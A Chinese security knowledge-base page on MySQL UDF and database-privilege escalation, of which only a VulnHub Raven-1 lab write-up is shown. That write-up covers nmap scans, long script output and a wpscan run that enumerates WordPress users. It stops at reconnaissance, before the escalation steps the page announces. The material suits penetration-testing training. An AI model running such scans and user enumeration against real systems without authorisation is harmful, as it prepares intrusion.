---
title: 数据库权限、UDF 与动态库加载
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/database/
categories:
- 系统安全
- 数据库权限
tags:
- 知识库
- MySQL
- UDF
- PHPMailer
- Zabbix
- MariaDB
- CVE-2021-27928
description: 数据库账户、数据库进程的系统身份以及插件路径权限共同决定扩展能力。本章保留 MySQL UDF、MariaDB 配置与应用初始入口，按数据、文件和执行三层核查。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

数据库账户、数据库进程的系统身份以及插件路径权限共同决定扩展能力。本章保留 MySQL UDF、MariaDB 配置与应用初始入口，按数据、文件和执行三层核查。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/database/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Raven 两篇分别保留 PHPMailer、编译的共享库、插件路径与 setuid 程序。

Shibboleth 的 Zabbix 身份连接 MariaDB 配置分支，不能只看数据库版本。

同类 UDF 出现在其他案例时，可从技术索引找到对应来源。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [数据库进程权限与 UDF](#case-raven-1) | Raven-1 | MySQL、UDF、PHPMailer |
| [PHPMailer 参数与 UDF 动态库](#case-raven-2) | Raven-2 | PHPMailer、UDF、MySQL |
| [管理平台与 MariaDB 加载路径](#case-shibboleth) | shibboleth | Zabbix、MariaDB、CVE-2021-27928 |

<a id="case-raven-1"></a>

## 数据库进程权限与 UDF

WordPress、PHPMailer 和配置文件连接 MySQL 身份，UDF 插件路径与进程权限决定本地执行。Python SUID 的替代路径也在原文中。

<p class="kb-provenance">来源 Raven-1 · 原记录 2020-02-12 · 30 个代码块 · 7 处图片引用</p>

<details class="kb-evidence" id="record-raven-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Raven-1 -->

#### 名称
名称：Raven: 1
发布日期：2018年8月14日

#### 下载

 - Download: https://drive.google.com/open?id=1pCFv-OXmknLVluUu_8ZCDr1XYWPDfLxW
 - Download (Mirror): https://download.vulnhub.com/raven/Raven.ova
 - Download (Torrent): https://download.vulnhub.com/raven/Raven.ova.torrent



#### 描述

Raven是初学者/中级boot2root计算机。有四个flag可以找到，并且有两个预期的root方法。使用VMware构建并在Virtual Box上进行了测试。设置为使用NAT网络。

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.0/24
Nmap scan report for 192.168.56.118
Host is up (0.00016s latency).
MAC Address: 08:00:27:D2:E6:4F (Oracle VirtualBox virtual NIC)

root@kali:~# nmap -p- -sV -v -Pn 192.168.56.118
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
36286/tcp open  status  1 (RPC #100024)

root@kali:~# nmap -p- -sU -Pn -v 192.168.56.118 --min-rate=10000
PORT    STATE SERVICE
111/udp open  rpcbind

root@kali:~# nmap -p 22,80,111,36286 -sV -v -Pn -A --script all 192.168.56.118 --min-rate=100000
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
|_banner: SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u4
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
| ssh-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 0 guesses in 1807 seconds, average tps: 0.0
| ssh-hostkey: 
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
| ssh-publickey-acceptance: 
|_  Accepted Public Keys: No public keys accepted
|_ssh-run: Failed to specify credentials and command to run.
| ssh2-enum-algos: 
|   kex_algorithms: (6)
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (4)
|       ssh-rsa
|       ssh-dss
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|       chacha20-poly1305@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_citrix-brute-xml: FAILED: No domain specified (use ntdomain argument)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-brute:   
|_  Path "/" does not require authentication
|_http-chrono: Request times for /; avg: 284.71ms; min: 236.36ms; max: 327.61ms
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.118
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 16
|     Comment: 
|         <!-- Site Title -->
|     
|     Path: http://192.168.56.118:80/css/owl.carousel.css
|     Line number: 112
|     Comment: 
|         
|         
|          */
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 3425
|     Comment: 
|         /*
|         ################
|                        End Blog Details  Page style
|         ################
|         */
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 1989
|     Comment: 
|         /* Nav Menu Essentials */
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 2028
|     Comment: 
|         /* Nav Menu Arrows */
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 10
|     Comment: 
|         /* Code for Firefox */
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 196
|     Comment: 
|         <!-- Start team Area -->
|     
|     Path: http://192.168.56.118:80/css/owl.carousel.css
|     Line number: 81
|     Comment: 
|         
|         
|          */
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 12
|     Comment: 
|         <!-- Meta Keyword -->
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 150
|     Comment: 
|         <!-- #colophon -->
|     
|     Path: http://192.168.56.118:80/js/jquery.counterup.min.js
|     Line number: 1
|     Comment: 
|         /*!
|         * jquery.counterup.js 1.0
|         *
|         * Copyright 2013, Benjamin Intal http://gambit.ph @bfintal
|         * Released under the GPL v2 License
|         *
|         * Date: Nov 26, 2013
|         */
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 106
|     Comment: 
|         /**
|          *  Typography
|          *
|          **/
|     
|     Path: http://192.168.56.118:80/js/waypoints.min.js
|     Line number: 2
|     Comment: 
|         /*
|         jQuery Waypoints - v2.0.3
|         Copyright (c) 2011-2013 Caleb Troughton
|         Dual licensed under the MIT license and GPL license.
|         https://github.com/imakewebthings/jquery-waypoints/blob/master/licenses.txt
|         */
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 15
|     Comment: 
|          // request type html/json/xml
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 4
|     Comment: 
|         <!-- Mobile Specific Meta -->
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 1
|     Comment: 
|         /*--------------------------- Color variations ----------------------*/
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 7
|     Comment: 
|         /*  Basic Style 
|         /* =================================== */
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 47
|     Comment: 
|         /* Microsoft Edge */
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 2208
|     Comment: 
|         /* Mobile Nav body classes */
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 107
|     Comment: 
|         <!-- #main -->
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 2057
|     Comment: 
|         /* Nav Meu Styling */
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 75
|     Comment: 
|         <!-- .site-branding -->
|     
|     Path: http://192.168.56.118:80/contact.php
|     Line number: 148
|     Comment: 
|         <!-- End contact-page Area -->
|     
|     Path: http://192.168.56.118:80/index.html
|     Line number: 291
|     Comment: 
|         <!-- End galery Area -->
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 156
|     Comment: 
|         /* ]]> */
|     
|     Path: http://192.168.56.118:80/css/owl.carousel.css
|     Line number: 129
|     Comment: 
|         
|         
|          */
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 154
|     Comment: 
|         /* <![CDATA[ */
|     
|     Path: http://192.168.56.118:80/js/jquery.sticky.js
|     Line number: 8
|     Comment: 
|         
|         // Website: http://labs.anthonygarand.com/sticky
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 152
|     Comment: 
|         <!-- #page -->
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 34
|     Comment: 
|         /* Mozilla Firefox 19+ */
|     
|     Path: http://192.168.56.118:80/js/superfish.min.js
|     Line number: 1
|     Comment: 
|         /*
|          * jQuery Superfish Menu Plugin - v1.7.9
|          * Copyright (c) 2016 Joel Birch
|          *
|          * Dual licensed under the MIT and GPL licenses:
|          *    http://www.opensource.org/licenses/mit-license.php
|          *    http://www.gnu.org/licenses/gpl.html
|          */
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 4
|     Comment: 
|         /* Mobile Layout: 320px */
|     
|     Path: http://192.168.56.118:80/js/jquery.sticky.js
|     Line number: 6
|     Comment: 
|         
|         // Created: 2/14/2011
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 27
|     Comment: 
|         /* Mozilla Firefox 4 to 18 */
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 141
|     Comment: 
|         <!-- #content -->
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 80
|     Comment: 
|         <!-- #masthead -->
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 137
|     Comment: 
|         <!-- #secondary -->
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 105
|     Comment: 
|         <!-- #post-## -->
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 108
|     Comment: 
|         <!-- #primary -->
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 102
|     Comment: 
|         <!-- .entry-content -->
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 97
|     Comment: 
|         <!-- .entry-header -->
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 16
|     Comment: 
|          // serialize form data
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 6
|     Comment: 
|         /* =================================== */
|     
|     Path: http://192.168.56.118:80/index.html
|     Line number: 210
|     Comment: 
|         <!-- End feature Area -->
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 3
|     Comment: 
|         /* Tablet Layout: 768px */
|     
|     Path: http://192.168.56.118:80/css/owl.carousel.css
|     Line number: 77
|     Comment: 
|         /* No Js */
|     
|     Path: http://192.168.56.118:80/css/owl.carousel.css
|     Line number: 118
|     Comment: 
|         
|         
|          */
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 77
|     Comment: 
|         <!-- .custom-header -->
|     
|     Path: http://192.168.56.118:80/js/jquery.sticky.js
|     Line number: 140
|     Comment: 
|          // should be more efficient than using $window.scroll(scroller) and $window.resize(resizer):
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 21
|     Comment: 
|         /* WebKit, Blink, Edge */
|     
|     Path: http://192.168.56.118:80/js/jquery.magnific-popup.min.js
|     Line number: 1
|     Comment: 
|         /*! Magnific Popup - v1.1.0 - 2016-02-20
|         * http://dimsemenov.com/plugins/magnific-popup/
|         * Copyright (c) 2016 Dmitry Semenov; */
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 2
|     Comment: 
|         /* Medium Layout: 1280px */
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 70
|     Comment: 
|         <!-- .site-branding-text -->
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 14
|     Comment: 
|         <!-- meta character set -->
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 269
|     Comment: 
|         <!-- start footer Area -->
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 41
|     Comment: 
|         /* Internet Explorer 10-11 */
|     
|     Path: http://192.168.56.118:80/css/linearicons.css
|     Line number: 22
|     Comment: 
|         /* Better Font Rendering =========== */
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 74
|     Comment: 
|         <!-- start banner Area -->
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 39
|     Comment: 
|         <!--[if lt IE 9]>
|         <script type='text/javascript' src='http://raven.local/wordpress/wp-content/themes/twentyseventeen/assets/js/html5.js?ver=3.7.3'></script>
|         <![endif]-->
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 36
|     Comment: 
|         <!--[if lt IE 9]>
|         <link rel='stylesheet' id='twentyseventeen-ie8-css'  href='http://raven.local/wordpress/wp-content/themes/twentyseventeen/assets/css/ie8.css?ver=1.0' type='text/css' media='all' />
|         <![endif]-->
|     
|     Path: http://192.168.56.118:80/js/jquery.nice-select.min.js
|     Line number: 1
|     Comment: 
|         /*  jQuery Nice Select - v1.0
|             https://github.com/hernansartorio/jquery-nice-select
|             Made by Hern\xC3\xA1n Sartorio  */
|     
|     Path: http://192.168.56.118:80/css/owl.carousel.css
|     Line number: 6
|     Comment: 
|         
|         
|          */
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 97
|     Comment: 
|         <!-- .entry-meta -->
|     
|     Path: http://192.168.56.118:80/css/owl.carousel.css
|     Line number: 29
|     Comment: 
|         /* fix for flashing background */
|     
|     Path: http://192.168.56.118:80/css/owl.carousel.css
|     Line number: 13
|     Comment: 
|         /* position relative and z-index fix webkit rendering fonts issue */
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 2101
|     Comment: 
|         /* Mobile Nav Toggle */
|     
|     Path: http://192.168.56.118:80/index.html
|     Line number: 368
|     Comment: 
|         <!-- End blog Area -->
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 20
|     Comment: 
|         <!--
|                               CSS
|                               ============================================= -->
|     
|     Path: http://192.168.56.118:80/js/parallax.min.js
|     Line number: 1
|     Comment: 
|         /*!
|          * parallax.js v1.5.0 (http://pixelcog.github.io/parallax.js/)
|          * @copyright 2016 PixelCog, Inc.
|          * @license MIT (https://github.com/pixelcog/parallax.js/blob/master/LICENSE)
|          */
|     
|     Path: http://192.168.56.118:80/js/jquery.ajaxchimp.min.js
|     Line number: 103
|     Comment: 
|          // Translate and display submit message
|     
|     Path: http://192.168.56.118:80/js/jquery.ajaxchimp.min.js
|     Line number: 69
|     Comment: 
|          // Translate and display message
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 151
|     Comment: 
|         <!-- .site-content-contain -->
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 10
|     Comment: 
|          // prevent default form submit
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 148
|     Comment: 
|         <!-- .site-info -->
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 23
|     Comment: 
|          // reset form
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 22
|     Comment: 
|          // fade in response data
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 14
|     Comment: 
|          // form submit method get/post
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 10
|     Comment: 
|         <!-- Meta Description -->
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 68
|     Comment: 
|         <!-- #nav-menu-container -->
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 19
|     Comment: 
|          // change submit button text
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 167
|     Comment: 
|         /**
|          * For modern browsers
|          * 1. The space content is one way to avoid an Opera bug when the
|          *    contenteditable attribute is included anywhere else in the document.
|          *    Otherwise it causes space to appear at the top and bottom of elements
|          *    that are clearfixed.
|          * 2. The use of `table` rather than `block` is only necessary if using
|          *    `:before` to contain the top-margins of child elements.
|          */
|     
|     Path: http://192.168.56.118:80/index.html
|     Line number: 150
|     Comment: 
|         <!-- Start feature Area -->
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 13
|     Comment: 
|          // form action url
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 280
|     Comment: 
|         <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
|     
|     Path: http://192.168.56.118:80/js/jquery.sticky.js
|     Line number: 4
|     Comment: 
|         
|         // Improvements by German M. Bravo (Kronuz) and Ruud Kamphuis (ruudk)
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 8
|     Comment: 
|          // form submit event
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 90
|     Comment: 
|         <!-- Start about-top Area -->
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 167
|     Comment: 
|         <!-- Start fact Area -->
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 111
|     Comment: 
|         <!-- Start service Area -->
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 3306
|     Comment: 
|         /*
|         ################
|                        Start Blog Details  Page style
|         ################
|         */
|     
|     Path: http://192.168.56.118:80/contact.php
|     Line number: 89
|     Comment: 
|         <!-- Start contact-page Area -->
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 3301
|     Comment: 
|         /*
|         ################
|                        End Blog Home  Page style
|         ################
|         */
|     
|     Path: http://192.168.56.118:80/css/owl.carousel.css
|     Line number: 1
|     Comment: 
|         
|         
|         
|         
|          */
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 4
|     Comment: 
|          // contact form
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 8
|     Comment: 
|         <!-- Author Meta -->
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 267
|     Comment: 
|         <!-- End team Area -->
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Line number: 74
|     Comment: 
|         <!-- .wrap -->
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 2046
|     Comment: 
|         /* Nav Meu Container */
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 165
|     Comment: 
|         <!-- End service Area -->
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 5
|     Comment: 
|         /* Wide Mobile Layout: 480px */
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 5
|     Comment: 
|          // submit button
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 318
|     Comment: 
|         <!-- End footer Area -->
|     
|     Path: http://192.168.56.118:80/js/jquery.sticky.js
|     Line number: 2
|     Comment: 
|         
|         // =============
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 110
|     Comment: 
|         <!-- End about-top Area -->
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 194
|     Comment: 
|         <!-- end fact Area -->
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 1
|     Comment: 
|          // -------   Mail Send ajax
|     
|     Path: http://192.168.56.118:80/js/jquery.sticky.js
|     Line number: 10
|     Comment: 
|         
|         //       It will only set the 'top' and 'position' of your element, you
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 3065
|     Comment: 
|         /*
|         ################
|                        Start Blog Home  Page style
|         ################
|         */
|     
|     Path: http://192.168.56.118:80/css/bootstrap.css
|     Line number: 1
|     Comment: 
|         /*!
|          * Bootstrap v4.0.0-beta (https://getbootstrap.com)
|          * Copyright 2011-2017 The Bootstrap Authors
|          * Copyright 2011-2017 Twitter, Inc.
|          * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
|          */
|     
|     Path: http://192.168.56.118:80/index.html
|     Line number: 293
|     Comment: 
|         <!-- Start blog Area -->
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 1875
|     Comment: 
|         /*--------------------------------------------------------------
|         # Header
|         --------------------------------------------------------------*/
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 2130
|     Comment: 
|         /* Mobile Nav Styling */
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 6
|     Comment: 
|         <!-- Favicon-->
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 6
|     Comment: 
|          // alert div for show alert message
|     
|     Path: http://192.168.56.118:80/css/main.css
|     Line number: 1986
|     Comment: 
|         /*--------------------------------------------------------------
|         # Navigation Menu
|         --------------------------------------------------------------*/
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 71
|     Comment: 
|         <!-- #header -->
|     
|     Path: http://192.168.56.118:80/about.html
|     Line number: 88
|     Comment: 
|         <!-- End banner Area -->
|     
|     Path: http://192.168.56.118:80/js/mail-script.js
|     Line number: 24
|     Comment: 
|          // reset submit button text
|     
|     Path: http://192.168.56.118:80/index.html
|     Line number: 241
|     Comment: 
|_        <!-- Start galery Area -->
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.118
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.118:80/
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://192.168.56.118:80/contact.php
|     Form id: myform
|     Form action: 
|     
|     Path: http://192.168.56.118:80/contact.php
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://192.168.56.118:80/team.html
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://192.168.56.118:80/index.html
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://192.168.56.118:80/about.html
|     Form id: 
|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&id=92a4423d01
|     
|     Path: http://192.168.56.118:80/wordpress/
|     Form id: search-form-5e446a40901ba
|_    Form action: http://raven.local/wordpress/
|_http-date: Wed, 12 Feb 2020 21:12:24 GMT; +8h00m00s from local time.
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|   /manual/: Potentially interesting folder
|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
| http-errors: 
| Spidering limited to: maxpagecount=40; withinhost=192.168.56.118
|   Found the following error pages: 
|   
|   Error Code: 404
|       http://192.168.56.118:80/blog-single.html
|   
|   Error Code: 404
|       http://192.168.56.118:80/contact.html
|   
|   Error Code: 404
|_      http://192.168.56.118:80/wordpress/%5c%22
|_http-feed: ERROR: Script execution failed (use -d to debug)
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-grep: 
|   (1) http://192.168.56.118:80/contact.php: 
|     (1) email: 
|       + support@codethemes.com
|   (1) http://192.168.56.118:80/blog-single.html: 
|     (1) ip: 
|_      + 192.168.56.118
| http-headers: 
|   Date: Wed, 12 Feb 2020 21:12:23 GMT
|   Server: Apache/2.4.10 (Debian)
|   Last-Modified: Sun, 12 Aug 2018 22:29:32 GMT
|   ETag: "41b3-5734482bdcb00"
|   Accept-Ranges: bytes
|   Content-Length: 16819
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-malware-host: Host appears to be clean
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-mobileversion-checker: No mobile version detected.
| http-referer-checker: 
| Spidering limited to: maxpagecount=30
|_  https://cdnjs.cloudflare.com:443/ajax/libs/popper.js/1.12.9/umd/popper.min.js
|_http-security-headers: 
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; html: 1
|     /css/
|       css: 6
|     /img/
|       jpg: 4; png: 1
|     /js/
|       js: 5
|     /wordpress/
|       Other: 1
|   Longest directory structure:
|     Depth: 1
|     Dir: /css/
|   Total files found (by extension):
|_    Other: 2; css: 6; html: 1; jpg: 4; js: 5; png: 1
|_http-slowloris: false
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Raven Security
| http-traceroute: 
|_  Possible reverse proxy detected.
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
| http-vhosts: 
| 126 names had status 200
|_ftp0
|_http-xssed: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind 2-4 (RPC #100000)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36286/tcp   status
|   100024  1          43516/udp   status
|   100024  1          46344/udp6  status
|_  100024  1          56752/tcp6  status
36286/tcp open  status  1 (RPC #100024)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
```

将攻击机的hosts文件中添加

``` bash
192.168.56.118 raven.local
```

访问下面的url发现该站点是wordpress搭建的

``` bash
http://192.168.56.118/wordpress/
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub211.jpg)

因此，想到的第一个想法是运行wpscan并查看该扫描所枚举的内容。


``` bash
root@kali:~/vulnhub/raven1# wpscan --url http://192.168.56.118/wordpress/ --wp-content-dir -ep -et -eu
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.6
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://192.168.56.118/wordpress/
[+] Started: Fri Feb 14 04:34:24 2020

Interesting Finding(s):

[+] http://192.168.56.118/wordpress/
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://192.168.56.118/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.56.118/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://192.168.56.118/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.56.118/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.7'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.56.118/wordpress/, Match: 'WordPress 4.8.7'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=============================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] michael
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] steven
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

